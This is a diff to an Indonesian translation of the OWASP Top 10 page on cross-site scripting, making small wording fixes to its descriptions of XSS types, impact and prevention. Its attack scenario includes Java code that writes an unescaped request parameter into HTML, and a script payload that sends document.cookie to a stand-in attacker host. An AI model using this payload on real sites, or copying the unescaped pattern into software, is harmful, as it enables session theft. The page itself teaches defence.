@@ -3,13 +3,13 @@
 | Agen ancaman / vektor serangan | Kelemahan Keamanan          | Dampak              |
 | -- | -- | -- |
 | Akses Lvl: Eksploitasi 3 | Prevalensi 3 : Deteksi 3 | Teknis 2 : Bisnis |
-| Tool otomatis dapat  mendeteksi dan melakukan exploit pada semua tiga type XSS, and ada Framework eksploitasi yang tersedia secara gratis. | XSS adalah kerentanan paling umum kedua di OWASP Top 10, dan  masih ditemukan di sekitar dua pertiga dari semua aplikasi. Tool otomatis dapat menemukan beberapa kerentanan XSS secara otomatis, Khususnya dalam aplikasi pemrograman seperti PHP, J2EE / JSP, dan ASP.NET. | Dampak pada XSS untuk kategori medium untuk Reflected XSS dan DOM XSS dan Kritikal untuk stored XSS, dengan eksekusi kode jarak jauh di browser korban, seperti mencuri kredensial, sesi, atau mengirimkan malware ke korban |
+| Tool otomasi dapat  mendeteksi dan melakukan exploit pada semua tiga type XSS, and ada Framework eksploitasi yang tersedia secara gratis. | XSS adalah kerentanan paling umum kedua di OWASP Top 10, dan  masih ditemukan di sekitar dua pertiga dari semua aplikasi. Tool otomasi dapat menemukan beberapa kerentanan XSS secara otomatis, Khususnya dalam aplikasi pemrograman seperti PHP, J2EE / JSP, dan ASP.NET. | Dampak pada XSS untuk kategori medium untuk Reflected XSS dan DOM XSS dan Kritikal untuk stored XSS, dengan eksekusi kode jarak jauh di browser korban, seperti mencuri kredensial, sesi, atau mengirimkan malware ke korban |
 
 ## Apakah Aplikasi itu Rentan?
 
 Ada Tiga Jenis XSS, biasanya menargetkan browser pengguna:
 
-* **Reflected XSS**: Aplikasi atau API menyertakan masukan pengguna yang tidak divalidasi dan tidak lolos sebagai bagian dari keluaran HTML. Serangan yang berhasil memungkinkan penyerang mengeksekusi HTML dan JavaScript sewenang-wenang di browser korban. Biasanya pengguna perlu berinteraksi dengan beberapa tautan berbahaya yang mengarah ke laman yang dikendalikan penyerang, seperti situs web lubang air berbahaya, iklan, atau sejenisnya
+* **Reflected XSS**: Aplikasi atau API menyertakan masukan pengguna yang tidak divalidasi dan tidak lolos sebagai bagian dari keluaran HTML. Serangan yang berhasil memungkinkan penyerang mengeksekusi HTML dan JavaScript sewenang-wenang di browser korban. Biasanya pengguna perlu berinteraksi dengan beberapa tautan berbahaya yang mengarah ke laman yang dikendalikan penyerang, seperti situs web watering hole berbahaya, iklan, atau sejenisnya
 * **Stored XSS**: Aplikasi atau API menyimpan masukan pengguna yang tidak dibersihkan yang dilihat di lain waktu oleh pengguna lain atau administrator. XSS yang disimpan sering dianggap sebagai risiko tinggi atau kritis.
 * **DOM XSS**: Kerangka kerja JavaScript, aplikasi halaman tunggal, dan API yang secara dinamis menyertakan data yang dapat dikontrol penyerang ke halaman rentan terhadap DOM XSS. Idealnya, aplikasi tidak akan mengirim data yang dapat dikontrol penyerang ke JavaScript API yang tidak aman.
 Serangan XSS termasuk pencurian sesi user, account takeover, _MFA bypass_, _DOM node replacement_ atau merubah tampilan website target (seperti panel login trojan), 
@@ -21,7 +21,7 @@ Pencegahan XSS membutuhkan pemisahan pada data yang tidak terpecaya dari konten 
 
 * Menggunakan kerangka kerja yang secara otomatis lolos dari XSS berdasarkan desain, seperti Ruby on Rails terbaru, React JS. Pelajari batasan perlindungan XSS setiap framework dan tangani kasus penggunaan yang tidak tercakup dengan tepat.
 * Mengeluarkan semua data yang tidak dipercaya berdasarkan konteks HTML (_body, attribute, JavaScript, CSS, atau URL)_ akan menutup celah Reflected and Stored XSS. Lihat OWASP XSS Prevention Cheat Sheet untuk detail dari teknik mengeluarkan data.
-* Menerapkan pengkodean peka konteks saat memodifikasi dokumen browser di sisi klien bertindak melawan DOM XSS. Jika hal ini tidak dapat dihindari, teknik pelolosan sensitif konteks serupa dapat diterapkan ke API browser seperti yang dijelaskan di OWASP Cheat Sheet 'DOM based XSS Prevention'.
+* Menerapkan pengkodean berkonteks peka saat memodifikasi dokumen browser di sisi klien bertindak melawan DOM XSS. Jika hal ini tidak dapat dihindari, teknik pelolosan sensitif konteks serupa dapat diterapkan ke API browser seperti yang dijelaskan di OWASP Cheat Sheet 'DOM based XSS Prevention'.
 * Memungkinkan [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)sebagai kontrol mitigasi pertahanan mendalam terhadap XSS. Ini efektif jika tidak ada kerentanan lain yang memungkinkan penempatan kode berbahaya melalui penyertaan file loka (e.g. path traversal menimpa atau pustaka yang rentan dari jaringan pengiriman konten yang diizinkan).
 
 ## Contoh Skenario Serangan
@@ -29,7 +29,7 @@ Pencegahan XSS membutuhkan pemisahan pada data yang tidak terpecaya dari konten 
 **Skenario #1**: Aplikasi menggunakan data tidak tepercaya dalam pembuatan kode HTML berikut tanpa validasi:
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
-The attacker modifies the ‘CC’ parameter in the browser to:
+Penyerang memodifikasi parameter ‘CC’ dalam browser menjadi:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
